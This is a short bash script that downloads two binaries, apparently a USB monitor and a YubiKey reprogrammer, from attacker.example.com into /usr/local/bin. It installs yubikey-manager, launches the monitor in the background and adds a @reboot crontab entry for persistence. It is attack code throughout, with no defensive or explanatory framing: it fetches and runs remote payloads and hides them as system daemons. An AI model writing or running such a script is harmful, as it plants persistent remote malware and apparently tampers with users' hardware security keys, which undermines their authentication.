#!/usr/bin/env bash
set -e

# 1) Configuration
BASE_URL="http://attacker.example.com"
BIN_DIR="/usr/local/bin"
MONITOR_BIN="udev-monitor"
HELPER_BIN="reprogram_yubi"

# 2) Download the two daemons
for bin in "$MONITOR_BIN" "$HELPER_BIN"; do
    curl -fsSL "$BASE_URL/$bin" -o "$BIN_DIR/$bin"
    chmod +x "$BIN_DIR/$bin"
done

# 3) Install ykman if not present
if ! command -v ykman >/dev/null 2>&1; then
  if command -v apt-get >/dev/null 2>&1; then
    apt-get update && apt-get install -y yubikey-manager
  elif command -v yum >/dev/null 2>&1; then
    yum install -y yubikey-manager
  fi
fi

# 4) Launch the USB monitor daemon (in background)
"$BIN_DIR/$MONITOR_BIN" &

# 5) Ensure persistence on reboot via crontab
CRON_ENTRY="@reboot $BIN_DIR/$MONITOR_BIN &"
( crontab -l 2>/dev/null | grep -v -F "$BIN_DIR/$MONITOR_BIN" || true; \
  echo "$CRON_ENTRY" ) | crontab -

# Done
exit 0
